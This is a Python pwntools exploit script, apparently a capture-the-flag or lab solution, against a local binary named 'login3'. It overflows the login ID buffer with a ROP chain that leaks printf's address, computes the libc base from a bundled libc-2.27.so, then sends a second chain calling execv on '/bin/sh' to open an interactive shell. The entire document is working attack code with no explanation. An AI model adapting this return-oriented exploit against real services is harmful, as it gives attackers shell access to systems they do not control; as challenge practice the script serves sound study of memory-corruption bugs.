from pwn import *


elf = ELF('./login3')
context.binary = elf

s = remote('localhost', 10003)

rop = ROP(elf)
rop.puts(elf.got.printf)
rop.main()
print(rop.dump())
s.sendlineafter(b'ID: ', b'a' * 0x28 + rop.chain())


print(s.recvline())
printf = s.recvline()
printf = unpack(printf[:-1].ljust(8, b'\x00'))
print('printf: %x' % printf)

libc = ELF('./libc-2.27.so')
libc.address = printf - libc.symbols.printf

rop = ROP(libc)
rop.execv(next(libc.search(b'/bin/sh')), 0)
print(rop.dump())
s.sendlineafter(b'ID: ', b'a' * 0x28 + rop.chain())

s.interactive()
